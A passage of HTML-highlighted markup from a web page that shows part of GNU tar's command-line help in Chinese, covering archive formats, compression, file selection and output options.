class=\"hljs-comment\">强制将</span> <span class=\"hljs-comment\">NAME</span>\n                             <span class=\"hljs-comment\">作为所添加的文件的所有者</span>\n  <span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">p</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">preserve</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">permissions</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">same</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">permissions</span>\n                             <span class=\"hljs-comment\">解压文件权限信息(默认只为超级用户服务)</span>\n      --<span class=\"hljs-comment\">preserve</span>             <span class=\"hljs-comment\">与</span> <span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">p</span> <span class=\"hljs-comment\">和</span> <span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">s</span> <span class=\"hljs-comment\">一样</span>\n      --<span class=\"hljs-comment\">same</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">owner</span>\n                             <span class=\"hljs-comment\">尝试解压时保持所有者关系一致(超级用户默认此项)</span>\n  <span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">s</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">preserve</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">order</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">same</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">order</span>\n                             <span class=\"hljs-comment\">member arguments are listed in the same order as</span>\n                             <span class=\"hljs-comment\">the files in the archive</span>\n\n <span class=\"hljs-comment\">Handling</span> <span class=\"hljs-comment\">of</span> <span class=\"hljs-comment\">extended</span> <span class=\"hljs-comment\">file</span> <span class=\"hljs-comment\">attributes:</span>\n\n      --<span class=\"hljs-comment\">acls</span>                 <span class=\"hljs-comment\">Enable</span> <span class=\"hljs-comment\">the</span> <span class=\"hljs-comment\">POSIX</span> <span class=\"hljs-comment\">ACLs</span> <span class=\"hljs-comment\">support</span>\n      --<span class=\"hljs-comment\">no</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">acls</span>              <span class=\"hljs-comment\">Disable</span> <span class=\"hljs-comment\">the</span> <span class=\"hljs-comment\">POSIX</span> <span class=\"hljs-comment\">ACLs</span> <span class=\"hljs-comment\">support</span>\n      --<span class=\"hljs-comment\">no</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">selinux</span>           <span class=\"hljs-comment\">Disable</span> <span class=\"hljs-comment\">the</span> <span class=\"hljs-comment\">SELinux</span> <span class=\"hljs-comment\">context</span> <span class=\"hljs-comment\">support</span>\n      --<span class=\"hljs-comment\">no</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">xattrs            Disable extended attributes support</span>\n      --<span class=\"hljs-comment\">selinux</span>              <span class=\"hljs-comment\">Enable</span> <span class=\"hljs-comment\">the</span> <span class=\"hljs-comment\">SELinux</span> <span class=\"hljs-comment\">context</span> <span class=\"hljs-comment\">support</span>\n      --<span class=\"hljs-comment\">xattrs               Enable extended attributes support</span>\n      --<span class=\"hljs-comment\">xattrs</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">exclude=MASK  specify the exclude pattern</span> <span class=\"hljs-comment\">for</span> <span class=\"hljs-comment\">xattr</span> <span class=\"hljs-comment\">keys</span>\n      --<span class=\"hljs-comment\">xattrs</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">include=MASK  specify the include pattern</span> <span class=\"hljs-comment\">for</span> <span class=\"hljs-comment\">xattr</span> <span class=\"hljs-comment\">keys</span>\n\n <span class=\"hljs-comment\">设备选择和切换:</span>\n\n  <span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">f</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">file=ARCHIVE</span>         <span class=\"hljs-comment\">使用归档文件或</span> <span class=\"hljs-comment\">ARCHIVE</span> <span class=\"hljs-comment\">设备</span>\n      --<span class=\"hljs-comment\">force</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">local</span>\n                             <span class=\"hljs-comment\">即使归档文件存在副本还是把它认为是本地归档</span>\n  <span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">F</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">info</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">script=名称</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">new</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">volume</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">script=名称</span>\n                             <span class=\"hljs-comment\">在每卷磁带最后运行脚本(隐含</span> <span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">M)</span>\n  <span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">L</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">tape</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">length=NUMBER</span>   <span class=\"hljs-comment\">写入</span> <span class=\"hljs-comment\">NUMBER</span> <span class=\"hljs-comment\">×</span> <span class=\"hljs-comment\">1024</span> <span class=\"hljs-comment\">字节后更换磁带</span>\n  <span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">M</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">multi</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">volume</span>         <span class=\"hljs-comment\">创建/列出/解压多卷归档文件</span>\n      --<span class=\"hljs-comment\">rmt</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">command=COMMAND</span>  <span class=\"hljs-comment\">使用指定的</span> <span class=\"hljs-comment\">rmt</span> <span class=\"hljs-comment\">COMMAND</span> <span class=\"hljs-comment\">代替</span> <span class=\"hljs-comment\">rmt</span>\n      --<span class=\"hljs-comment\">rsh</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">command=COMMAND</span>  <span class=\"hljs-comment\">使用远程</span> <span class=\"hljs-comment\">COMMAND</span> <span class=\"hljs-comment\">代替</span> <span class=\"hljs-comment\">rsh</span>\n      --<span class=\"hljs-comment\">volno</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">file=FILE</span>      <span class=\"hljs-comment\">使用/更新</span> <span class=\"hljs-comment\">FILE</span> <span class=\"hljs-comment\">中的卷数</span>\n\n <span class=\"hljs-comment\">设备分块:</span>\n\n  <span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">b</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">blocking</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">factor=BLOCKS</span>   <span class=\"hljs-comment\">每个记录</span> <span class=\"hljs-comment\">BLOCKS</span> <span class=\"hljs-comment\">x</span> <span class=\"hljs-comment\">512</span> <span class=\"hljs-comment\">字节</span>\n  <span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">B</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">read</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">full</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">records</span>    <span class=\"hljs-comment\">读取时重新分块(只对</span> <span class=\"hljs-comment\">4</span><span class=\"hljs-string\">.</span><span class=\"hljs-comment\">2BSD</span> <span class=\"hljs-comment\">管道有效)</span>\n  <span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">i</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">ignore</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">zeros</span>         <span class=\"hljs-comment\">忽略归档中的零字节块(即文件结尾)</span>\n      --<span class=\"hljs-comment\">record</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">size=NUMBER</span>   <span class=\"hljs-comment\">每个记录的字节数</span> <span class=\"hljs-comment\">NUMBER，乘以</span> <span class=\"hljs-comment\">512</span>\n\n <span class=\"hljs-comment\">选择归档格式:</span>\n\n  <span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">H</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">format=FORMAT</span>        <span class=\"hljs-comment\">创建指定格式的归档</span>\n\n <span class=\"hljs-comment\">FORMAT</span> <span class=\"hljs-comment\">是以下格式中的一种:</span>\n\n    <span class=\"hljs-comment\">gnu</span>                      <span class=\"hljs-comment\">GNU</span> <span class=\"hljs-comment\">tar</span> <span class=\"hljs-comment\">1</span><span class=\"hljs-string\">.</span><span class=\"hljs-comment\">13</span><span class=\"hljs-string\">.</span><span class=\"hljs-comment\">x</span> <span class=\"hljs-comment\">格式</span>\n    <span class=\"hljs-comment\">oldgnu</span>                   <span class=\"hljs-comment\">GNU</span> <span class=\"hljs-comment\">格式</span> <span class=\"hljs-comment\">as</span> <span class=\"hljs-comment\">per</span> <span class=\"hljs-comment\">tar</span> &lt;<span class=\"hljs-comment\">=</span> <span class=\"hljs-comment\">1</span><span class=\"hljs-string\">.</span><span class=\"hljs-comment\">12</span>\n    <span class=\"hljs-comment\">pax</span>                      <span class=\"hljs-comment\">POSIX</span> <span class=\"hljs-comment\">1003</span><span class=\"hljs-string\">.</span><span class=\"hljs-comment\">1</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">2001</span> <span class=\"hljs-comment\">(pax)</span> <span class=\"hljs-comment\">格式</span>\n    <span class=\"hljs-comment\">posix</span>                    <span class=\"hljs-comment\">等同于</span> <span class=\"hljs-comment\">pax</span>\n    <span class=\"hljs-comment\">ustar</span>                    <span class=\"hljs-comment\">POSIX</span> <span class=\"hljs-comment\">1003</span><span class=\"hljs-string\">.</span><span class=\"hljs-comment\">1</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">1988</span> <span class=\"hljs-comment\">(ustar)</span> <span class=\"hljs-comment\">格式</span>\n    <span class=\"hljs-comment\">v7</span>                       <span class=\"hljs-comment\">old</span> <span class=\"hljs-comment\">V7</span> <span class=\"hljs-comment\">tar</span> <span class=\"hljs-comment\">格式</span>\n\n      --<span class=\"hljs-comment\">old</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">archive</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">portability</span>\n                             <span class=\"hljs-comment\">等同于</span> --<span class=\"hljs-comment\">format=v7</span>\n      --<span class=\"hljs-comment\">pax</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">option=关键字</span><span class=\"hljs-title\">[</span><span class=\"hljs-title\">[</span><span class=\"hljs-comment\">:</span><span class=\"hljs-title\">]</span><span class=\"hljs-comment\">=值</span><span class=\"hljs-title\">]</span><span class=\"hljs-title\">[</span><span class=\"hljs-string\">,</span><span class=\"hljs-comment\">关键字</span><span class=\"hljs-title\">[</span><span class=\"hljs-title\">[</span><span class=\"hljs-comment\">:</span><span class=\"hljs-title\">]</span><span class=\"hljs-comment\">=值</span><span class=\"hljs-title\">]</span><span class=\"hljs-title\">]</span><span class=\"hljs-string\">.</span><span class=\"hljs-string\">.</span><span class=\"hljs-string\">.</span>\n                             <span class=\"hljs-comment\">控制</span> <span class=\"hljs-comment\">pax</span> <span class=\"hljs-comment\">关键字</span>\n      --<span class=\"hljs-comment\">posix</span>                <span class=\"hljs-comment\">等同于</span> --<span class=\"hljs-comment\">format=posix</span>\n  <span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">V</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">label=TEXT</span>           <span class=\"hljs-comment\">创建带有卷名</span> <span class=\"hljs-comment\">TEXT</span>\n                             <span class=\"hljs-comment\">的归档；在列出/解压时，使用</span> <span class=\"hljs-comment\">TEXT</span>\n                             <span class=\"hljs-comment\">作为卷名的模式串</span>\n\n <span class=\"hljs-comment\">压缩选项:</span>\n\n  <span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">a</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">auto</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">compress</span>        <span class=\"hljs-comment\">使用归档后缀名来决定压缩程序</span>\n  <span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">I</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">use</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">compress</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">program=PROG</span>\n                             <span class=\"hljs-comment\">通过</span> <span class=\"hljs-comment\">PROG</span> <span class=\"hljs-comment\">过滤(必须是能接受</span> <span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">d</span>\n                             <span class=\"hljs-comment\">选项的程序)</span>\n  <span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">j</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">bzip2</span>                <span class=\"hljs-comment\">通过</span> <span class=\"hljs-comment\">bzip2</span> <span class=\"hljs-comment\">过滤归档</span>\n  <span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">J</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">xz</span>                   <span class=\"hljs-comment\">通过</span> <span class=\"hljs-comment\">xz</span> <span class=\"hljs-comment\">过滤归档</span>\n      --<span class=\"hljs-comment\">lzip</span>                 <span class=\"hljs-comment\">通过</span> <span class=\"hljs-comment\">lzip</span> <span class=\"hljs-comment\">过滤归档</span>\n      --<span class=\"hljs-comment\">lzma</span>                 <span class=\"hljs-comment\">通过</span> <span class=\"hljs-comment\">lzma</span> <span class=\"hljs-comment\">过滤归档</span>\n      --<span class=\"hljs-comment\">lzop</span>\n      --<span class=\"hljs-comment\">no</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">auto</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">compress</span>     <span class=\"hljs-comment\">不使用归档后缀名来决定压缩程序</span>\n  <span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">z</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">gzip</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">gunzip</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">ungzip</span>   <span class=\"hljs-comment\">通过</span> <span class=\"hljs-comment\">gzip</span> <span class=\"hljs-comment\">过滤归档</span>\n  <span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">Z</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">compress</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">uncompress</span>   <span class=\"hljs-comment\">通过</span> <span class=\"hljs-comment\">compress</span> <span class=\"hljs-comment\">过滤归档</span>\n\n <span class=\"hljs-comment\">本地文件选择:</span>\n\n      --<span class=\"hljs-comment\">add</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">file=FILE</span>        <span class=\"hljs-comment\">添加指定的</span> <span class=\"hljs-comment\">FILE</span> <span class=\"hljs-comment\">至归档(如果名字以</span> <span class=\"hljs-literal\">-</span>\n                             <span class=\"hljs-comment\">开始会很有用的)</span>\n      --<span class=\"hljs-comment\">backup</span><span class=\"hljs-title\">[</span><span class=\"hljs-comment\">=CONTROL</span><span class=\"hljs-title\">]</span>     <span class=\"hljs-comment\">在删除前备份，选择</span> <span class=\"hljs-comment\">CONTROL</span> <span class=\"hljs-comment\">版本</span>\n  <span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">C</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">directory=DIR</span>        <span class=\"hljs-comment\">改变至目录</span> <span class=\"hljs-comment\">DIR</span>\n      --<span class=\"hljs-comment\">exclude=PATTERN</span>      <span class=\"hljs-comment\">排除以</span> <span class=\"hljs-comment\">PATTERN</span> <span class=\"hljs-comment\">指定的文件</span>\n      --<span class=\"hljs-comment\">exclude</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">backups</span>      <span class=\"hljs-comment\">排除备份和锁文件</span>\n      --<span class=\"hljs-comment\">exclude</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">caches</span>       <span class=\"hljs-comment\">除标识文件本身外，排除包含</span>\n                             <span class=\"hljs-comment\">CACHEDIR</span><span class=\"hljs-string\">.</span><span class=\"hljs-comment\">TAG</span> <span class=\"hljs-comment\">的目录中的内容</span>\n      --<span class=\"hljs-comment\">exclude</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">caches</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">all</span>   <span class=\"hljs-comment\">排除包含</span> <span class=\"hljs-comment\">CACHEDIR</span><span class=\"hljs-string\">.</span><span class=\"hljs-comment\">TAG</span> <span class=\"hljs-comment\">的目录</span>\n      --<span class=\"hljs-comment\">exclude</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">caches</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">under</span> <span class=\"hljs-comment\">排除包含</span> <span class=\"hljs-comment\">CACHEDIR</span><span class=\"hljs-string\">.</span><span class=\"hljs-comment\">TAG</span> <span class=\"hljs-comment\">的目录中所有内容</span>\n\n      --<span class=\"hljs-comment\">exclude</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">tag=FILE</span>     <span class=\"hljs-comment\">除</span> <span class=\"hljs-comment\">FILE</span> <span class=\"hljs-comment\">自身外，排除包含</span> <span class=\"hljs-comment\">FILE</span>\n                             <span class=\"hljs-comment\">的目录中的内容</span>\n      --<span class=\"hljs-comment\">exclude</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">tag</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">all=FILE</span> <span class=\"hljs-comment\">排除包含</span> <span class=\"hljs-comment\">FILE</span> <span class=\"hljs-comment\">的目录</span>\n      --<span class=\"hljs-comment\">exclude</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">tag</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">under=FILE</span>   <span class=\"hljs-comment\">排除包含</span> <span class=\"hljs-comment\">FILE</span> <span class=\"hljs-comment\">的目录中的所有内容</span>\n      --<span class=\"hljs-comment\">exclude</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">vcs</span>          <span class=\"hljs-comment\">排除版本控制系统目录</span>\n  <span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">h</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">dereference</span>\n                             <span class=\"hljs-comment\">跟踪符号链接；将它们所指向的文件归档并输出</span>\n      --<span class=\"hljs-comment\">hard</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">dereference</span>\n                             <span class=\"hljs-comment\">跟踪硬链接；将它们所指向的文件归档并输出</span>\n  <span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">K</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">starting</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">file=MEMBER</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">NAME</span>\n                             <span class=\"hljs-comment\">begin</span> <span class=\"hljs-comment\">at</span> <span class=\"hljs-comment\">member</span> <span class=\"hljs-comment\">MEMBER</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">NAME</span> <span class=\"hljs-comment\">when</span> <span class=\"hljs-comment\">reading</span> <span class=\"hljs-comment\">the</span>\n                             <span class=\"hljs-comment\">archive</span>\n      --<span class=\"hljs-comment\">newer</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">mtime=DATE</span>     <span class=\"hljs-comment\">当只有数据改变时比较数据和时间</span>\n      --<span class=\"hljs-comment\">no</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">null</span>              <span class=\"hljs-comment\">禁用上一次的效果</span> --<span class=\"hljs-comment\">null</span> <span class=\"hljs-comment\">选项</span>\n      --<span class=\"hljs-comment\">no</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">recursion</span>         <span class=\"hljs-comment\">避免目录中的自动降级</span>\n      --<span class=\"hljs-comment\">no</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">unquote</span>           <span class=\"hljs-comment\">不以</span> <span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">T</span> <span class=\"hljs-comment\">读取的文件名作为引用结束</span>\n      --<span class=\"hljs-comment\">null</span>                 <span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">T</span> <span class=\"hljs-comment\">读取以空终止的名字，</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">C</span> <span class=\"hljs-comment\">禁用</span>\n  <span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">N</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">newer=DATE</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">OR</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">FILE</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">after</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">date=DATE</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">OR</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">FILE</span>\n                             <span class=\"hljs-comment\">只保存比</span> <span class=\"hljs-comment\">DATE</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">OR</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">FILE</span> <span class=\"hljs-comment\">更新的文件</span>\n      --<span class=\"hljs-comment\">one</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">file</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">system</span>      <span class=\"hljs-comment\">创建归档时保存在本地文件系统中</span>\n  <span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">P</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">absolute</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">names</span>       <span class=\"hljs-comment\">不要从文件名中清除引导符‘/’</span>\n      --<span class=\"hljs-comment\">recursion</span>            <span class=\"hljs-comment\">目录递归(默认)</span>\n      --<span class=\"hljs-comment\">suffix=STRING</span>        <span class=\"hljs-comment\">在删除前备份，除非被环境变量</span>\n                             <span class=\"hljs-comment\">SIMPLE_BACKUP_SUFFIX</span>\n                             <span class=\"hljs-comment\">覆盖，否则覆盖常用后缀(‘’)</span>\n  <span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">T</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">files</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">from=FILE</span>      <span class=\"hljs-comment\">从</span> <span class=\"hljs-comment\">FILE</span>\n                             <span class=\"hljs-comment\">中获取文件名来解压或创建文件</span>\n      --<span class=\"hljs-comment\">unquote</span>              <span class=\"hljs-comment\">以</span> <span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">T</span>\n                             <span class=\"hljs-comment\">读取的文件名作为引用结束(默认)</span>\n  <span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">X</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">exclude</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">from=FILE</span>    <span class=\"hljs-comment\">排除</span> <span class=\"hljs-comment\">FILE</span> <span class=\"hljs-comment\">中列出的模式串</span>\n\n <span class=\"hljs-comment\">文件名变换:</span>\n\n      --<span class=\"hljs-comment\">strip</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">components=NUMBER</span>   <span class=\"hljs-comment\">解压时从文件名中清除</span> <span class=\"hljs-comment\">NUMBER</span>\n                             <span class=\"hljs-comment\">个引导部分</span>\n      --<span class=\"hljs-comment\">transform=EXPRESSION</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">xform=EXPRESSION</span>\n                             <span class=\"hljs-comment\">使用</span> <span class=\"hljs-comment\">sed</span> <span class=\"hljs-comment\">代替</span> <span class=\"hljs-comment\">EXPRESSION</span>\n                             <span class=\"hljs-comment\">来进行文件名变换</span>\n\n <span class=\"hljs-comment\">文件名匹配选项(同时影响排除和包括模式串):</span>\n\n      --<span class=\"hljs-comment\">anchored</span>             <span class=\"hljs-comment\">模式串匹配文件名头部</span>\n      --<span class=\"hljs-comment\">ignore</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">case</span>          <span class=\"hljs-comment\">忽略大小写</span>\n      --<span class=\"hljs-comment\">no</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">anchored</span>          <span class=\"hljs-comment\">模式串匹配任意‘/’后字符(默认对</span>\n                             <span class=\"hljs-comment\">exclusion</span> <span class=\"hljs-comment\">有效)</span>\n      --<span class=\"hljs-comment\">no</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">ignore</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">case</span>       <span class=\"hljs-comment\">匹配大小写(默认)</span>\n      --<span class=\"hljs-comment\">no</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">wildcards</span>         <span class=\"hljs-comment\">逐字匹配字符串</span>\n      --<span class=\"hljs-comment\">no</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">wildcards</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">match</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">slash</span>   <span class=\"hljs-comment\">通配符不匹配‘/’</span>\n      --<span class=\"hljs-comment\">wildcards</span>            <span class=\"hljs-comment\">use</span> <span class=\"hljs-comment\">wildcards</span> <span class=\"hljs-comment\">(default)</span>\n      --<span class=\"hljs-comment\">wildcards</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">match</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">slash</span>\n                             <span class=\"hljs-comment\">通配符匹配‘/’(默认对排除操作有效)</span>\n\n <span class=\"hljs-comment\">提示性输出:</span>\n\n      --<span class=\"hljs-comment\">checkpoint</span><span class=\"hljs-title\">[</span><span class=\"hljs-comment\">=NUMBER</span><span class=\"hljs-title\">]</span>  <span class=\"hljs-comment\">每隔</span> <span class=\"hljs-comment\">NUMBER</span>\n                             <span class=\"hljs-comment\">个记录显示进度信息(默认为</span> <span class=\"hljs-comment\">10</span> <span class=\"hljs-comment\">个)</span>\n      --<span class=\"hljs-comment\">checkpoint</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">action=ACTION</span>   <span class=\"hljs-comment\">在每个检查点上执行</span> <span class=\"hljs-comment\">ACTION</span>\n      --<span class=\"hljs-comment\">full</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">time            print file time to</span> <span class=\"hljs-comment\">its</span> <span class=\"hljs-comment\">full</span> <span class=\"hljs-comment\">resolution</span>\n      --<span class=\"hljs-comment\">index</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">file=FILE</span>      <span class=\"hljs-comment\">将详细输出发送至</span> <span class=\"hljs-comment\">FILE</span>\n  <span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">l</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">check</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">links</span>\n                             <span class=\"hljs-comment\">只要不是所有链接都被输出就打印信息</span>\n      --<span class=\"hljs-comment\">no</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">quote</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">chars=STRING</span>   <span class=\"hljs-comment\">禁用来自</span> <span class=\"hljs-comment\">STRING</span> <span class=\"hljs-comment\">的字符引用</span>\n      --<span class=\"hljs-comment\">quote</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">chars=STRING</span>   <span class=\"hljs-comment\">来自</span> <span class=\"hljs-comment\">STRING</span> <span class=\"hljs-comment\">的额外的引用字符</span>\n      --<span class=\"hljs-comment\">quoting</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">style=STYLE</span>  <span class=\"hljs-comment\">设置名称引用风格；有效的</span> <span class=\"hljs-comment\">STYLE</span>\n                             <span class=\"hljs-comment\">值请参阅以下说明</span>\n  <span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">R</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">block</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">number</span>         <span class=\"hljs-comment\">每个信息都显示归档内的块数</span>\n      --<span class=\"hljs-comment\">show</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">defaults</span>        <span class=\"hljs-comment\">显示</span> <span class=\"hljs-comment\">tar</span> <span class=\"hljs-comment\">默认选项</span>\n      --<span class=\"hljs-comment\">show</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">omitted</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">dirs</span>\n                             <span class=\"hljs-comment\">列表或解压时，列出每个不匹配查找标准的目录</span>\n      --<span class=\"hljs-comment\">show</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">transformed</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">names</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">show</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">stored</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">names</span>\n                             <span class=\"hljs-comment\">显示变换后的文件名或归档名</span>\n      --<span class=\"hljs-comment\">totals</span><span class=\"hljs-title\">[</span><span class=\"hljs-comment\">=SIGNAL</span><span class=\"hljs-title\">]</span>      <span class=\"hljs-comment\">处理归档后打印出总字节数；当此</span>\n                             <span class=\"hljs-comment\">SIGNAL</span> <span class=\"hljs-comment\">被触发时带参数</span> <span class=\"hljs-literal\">-</span>\n                             <span class=\"hljs-comment\">打印总字节数；允许的信号为:</span>\n                             <span class=\"hljs-comment\">SIGHUP，SIGQUIT，SIGINT，SIGUSR1</span> <span class=\"hljs-comment\">和</span>\n                             <span class=\"hljs-comment\">SIGUSR2；同时也接受不带</span> <span class=\"hljs-comment\">SIG</span>\n                             <span 